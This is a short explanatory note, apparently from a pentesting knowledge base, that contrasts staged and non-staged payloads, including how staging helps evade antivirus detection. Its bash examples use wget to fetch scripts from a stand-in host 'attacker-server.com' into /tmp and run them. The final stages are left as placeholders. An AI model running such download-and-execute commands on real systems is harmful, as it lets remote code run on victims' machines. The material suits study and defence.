# üçú Staged vs Non-Staged Payloads

**Staged Payloads:**

* **Definition:** Staged payloads are delivered in multiple stages or pieces.
* **How it works:** The initial payload delivered to the target system is small and has the sole purpose of setting up a communication channel back to the attacker's system. Once this connection is established, additional components (stages) of the payload are sent and executed on the target system.
* **Pros:**
  * Smaller initial payload, making it less likely to be detected by security measures.
  * Easier to evade antivirus or intrusion detection systems during the initial delivery.
* **Cons:**
  * Execution may take longer due to multiple stages being delivered.
  * There's a possibility of being detected during subsequent stages.

**Non-Staged Payloads:**

* **Definition:** Non-staged payloads are delivered in a single, comprehensive piece.
* **How it works:** The entire payload, including all the necessary components, is delivered to the target system in one go. Once on the target, the payload is executed and performs its intended actions.
* **Pros:**
  * Faster execution as there is no need for multiple stages.
  * There's only one payload to be detected, potentially making it simpler to defend against.
* **Cons:**
  * The larger size of the payload may increase the chances of being detected during delivery.
  * Increased likelihood of being flagged by antivirus or intrusion detection systems.

**Summary:**

* **Staged Payloads:** Break the payload into smaller stages for delivery, making it harder to detect initially.
* **Non-Staged Payloads:** Deliver the entire payload at once, which can be faster but may be more easily detected due to its larger size.

<figure><img src="https://www.scaler.com/topics/images/staged-vs-non-staged-payloads_thumbnail.webp" alt=""><figcaption></figcaption></figure>

#### Staged Payload Example:

**Stager (Initial Payload):**

```bash
# Stager script (stage 1)
echo "Staging... establishing connection to attacker's server"
wget <http://attacker-server.com/stage1.sh> -O /tmp/stage1.sh
bash /tmp/stage1.sh

```

**Stage 1:**

```bash
# Stage 1 script (downloads additional stages)
echo "Executing Stage 1..."
wget <http://attacker-server.com/stage2.sh> -O /tmp/stage2.sh
bash /tmp/stage2.sh
```

**Stage 2:**

```bash
# Stage 2 script (final payload)
echo "Executing Final Payload..."
# Actual malicious actions here
```

In this example, the initial stager script sets up the connection and downloads additional stages. Each subsequent stage contains part of the payload, and the final stage executes the malicious actions.

#### Non-Staged Payload Example:

**Non-Staged Payload:**

```bash
# Single payload script
echo "Executing Non-Staged Payload..."
# Actual malicious actions here
```

In this example, the entire payload, including all the necessary components, is delivered in a single script. There are no separate stages, and the malicious actions are executed directly.

#### Comparison:

* **Staged Payloads:** The payload is delivered in multiple stages, with each stage responsible for a specific task. This can be useful for evading detection during the initial delivery.
* **Non-Staged Payloads:** The entire payload is delivered in one go. While it may execute faster, the larger size increases the risk of detection during delivery.
